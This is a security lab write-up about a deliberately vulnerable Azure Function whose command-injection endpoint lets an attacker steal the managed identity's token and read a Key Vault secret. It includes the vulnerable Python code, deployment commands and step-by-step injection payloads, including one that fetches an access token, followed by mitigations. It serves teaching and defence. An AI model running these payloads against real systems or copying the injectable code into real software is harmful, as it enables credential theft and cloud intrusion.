# Azure Function — Key Vault Secret Leak via Managed Identity Abuse

A Function uses its managed identity to read a Key Vault secret server-side
and never returns it directly — but a command-injection bug in an unrelated
endpoint of the same Function lets an attacker steal the identity's own
token and read the secret **directly from Key Vault**, bypassing the app's
own logic entirely.

```
Application Vulnerability  →  Function Compromised  →  Managed Identity  →  Key Vault Secrets User  →  Secret Value
```

## Environment

| Resource | Value |
|---|---|
| Resource group | `rg-func-kv-leak-lab` (region `westeurope`) |
| Function App | Linux, Python 3.11, Consumption plan |
| Key Vault | RBAC authorization mode |
| Secret | `db-password` (a fake demo value, not a real credential) |
| Role granted to the Function's managed identity | **Key Vault Secrets User** (get/list only), scoped to this one vault |

## The code

`function_app.py` has two endpoints:

```python
@app.route(route="db-status", methods=["GET"])
def db_status(req):
    # Legit use: fetch secret server-side, only ever return a boolean/length
    client = SecretClient(vault_url=VAULT_URL, credential=DefaultAzureCredential())
    secret = client.get_secret(SECRET_NAME)
    return func.HttpResponse(f"DB configured: True (secret length={len(secret.value)})")

@app.route(route="lookup", methods=["GET"])
def lookup(req):
    # Vulnerable: unsanitized input into a shell command
    host = req.params.get("host", "127.0.0.1")
    result = subprocess.run(f"getent hosts {host}", shell=True, capture_output=True, text=True, timeout=15)
    return func.HttpResponse(result.stdout + result.stderr)
```

`/api/db-status` is the correct way to use a managed identity — the secret
never leaves the process. `/api/lookup` is an unrelated "hostname lookup"
endpoint with a command-injection bug. The vulnerability doesn't need to be
anywhere near the Key Vault code — any code-exec bug in the same Function
process inherits the same identity and the same access.

## Deploy

The Python packages (`azure-identity`, `azure-keyvault-secrets`) must be
vendored into the zip — `az functionapp deployment source config-zip` uses
a "run from package" blob path for Linux Python Consumption apps that does
**not** run a remote pip build, even with
`SCM_DO_BUILD_DURING_DEPLOYMENT=true` set.

```bash
RG=rg-func-kv-leak-lab
LOC=westeurope
STORAGE=stfunckvleak$RANDOM
FUNCAPP=func-kv-leak-lab-$RANDOM
KV=kv-leak-lab-$RANDOM

az group create -n $RG -l $LOC
az storage account create -n $STORAGE -g $RG -l $LOC --sku Standard_LRS
az provider register --namespace Microsoft.KeyVault   # one-time per subscription
az keyvault create -n $KV -g $RG -l $LOC --enable-rbac-authorization true
az functionapp create -g $RG --consumption-plan-location $LOC \
  --runtime python --runtime-version 3.11 --functions-version 4 \
  --name $FUNCAPP --storage-account $STORAGE --os-type Linux

# Create the demo secret (needs Key Vault Secrets Officer on yourself first)
MY_OID=$(az ad signed-in-user show --query id -o tsv)
SUB_ID=$(az account show --query id -o tsv)
az role assignment create --assignee-object-id $MY_OID --assignee-principal-type User \
  --role "Key Vault Secrets Officer" --scope /subscriptions/$SUB_ID/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/$KV
sleep 30  # RBAC propagation
az keyvault secret set --vault-name $KV -n db-password --value "DEMO-FAKE-DB-PW-not-a-real-secret-4f9a2c"

# Give the Function's identity read-only access to the vault
PRINCIPAL_ID=$(az functionapp identity assign -g $RG -n $FUNCAPP --query principalId -o tsv)
az role assignment create --assignee-object-id $PRINCIPAL_ID --assignee-principal-type ServicePrincipal \
  --role "Key Vault Secrets User" --scope /subscriptions/$SUB_ID/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/$KV

az functionapp config appsettings set -g $RG -n $FUNCAPP --settings \
  AzureWebJobsFeatureFlags=EnableWorkerIndexing \
  SCM_DO_BUILD_DURING_DEPLOYMENT=true \
  KEY_VAULT_URL=https://$KV.vault.azure.net/ \
  DB_SECRET_NAME=db-password

# Vendor dependencies into the zip
pip3 install --target=.python_packages/lib/site-packages \
  --platform manylinux2014_x86_64 --implementation cp --python-version 3.11 \
  --only-binary=:all: -r requirements.txt

zip -rq /tmp/kv-leak-demo.zip . -x "*.git*"
az functionapp deployment source config-zip -g $RG -n $FUNCAPP --src /tmp/kv-leak-demo.zip
```

## Instructions

1. Confirm the legitimate path works — the secret is used, never exposed:

```bash
curl "https://$FUNCAPP.azurewebsites.net/api/db-status"
# DB configured: True (secret length=40)
```

2. Confirm the vulnerable endpoint's normal behavior:

```bash
curl "https://$FUNCAPP.azurewebsites.net/api/lookup?host=example.com"
```

3. Exploit the command injection:

```bash
curl "https://$FUNCAPP.azurewebsites.net/api/lookup?host=127.0.0.1;id"
# uid=1000(app) gid=1000(app) groups=1000(app)
```

4. Steal the identity's Key Vault-scoped token through the same injection
   point. Azure Functions/App Service exposes managed identity via the
   `IDENTITY_ENDPOINT` / `IDENTITY_HEADER` environment variables on
   localhost — **not** the VM-style `169.254.169.254` IMDS endpoint:

```bash
curl -G "https://$FUNCAPP.azurewebsites.net/api/lookup" \
  --data-urlencode 'host=127.0.0.1;curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01"'
```

Extract `access_token` from the JSON response.

5. Use the stolen token to read the secret directly from Key Vault — no
   Key Vault role assignment of your own is needed:

```bash
TOKEN="<access_token from step 4>"
curl -H "Authorization: Bearer $TOKEN" \
  "https://$KV.vault.azure.net/secrets/db-password?api-version=7.4"
```

Result:

```json
{"value":"DEMO-FAKE-DB-PW-not-a-real-secret-4f9a2c", ...}
```

The secret was retrieved without ever calling `db-status`, without any Key
Vault RBAC grant of your own, and without touching Azure credentials — the
app's own "only return a boolean" logic was bypassed entirely by going
straight to the identity and the vault's REST API.

## Mitigation

- **Fix the app vulnerability first** — use `subprocess.run([...])` with an
  argument list, never `shell=True` with unsanitized input.
- **"Least privilege" Key Vault access is still full access to that
  secret** — `Key Vault Secrets User` sounds minimal, but if the workload
  is compromised, the attacker gets every secret that role can read, not
  just the one the app's own code happens to fetch.
- **Split secrets across vaults / use per-secret RBAC conditions** if a
  Function only needs one specific secret — Azure RBAC supports
  data-action conditions scoped to a secret name.
- **Rotate secrets Functions can read, and monitor Key Vault access logs**
  for reads that don't correlate with an actual app code path.
- The managed identity itself isn't the flaw — what it's allowed to reach
  is.

## Cleanup

```bash
az group delete -n rg-func-kv-leak-lab --yes --no-wait
```
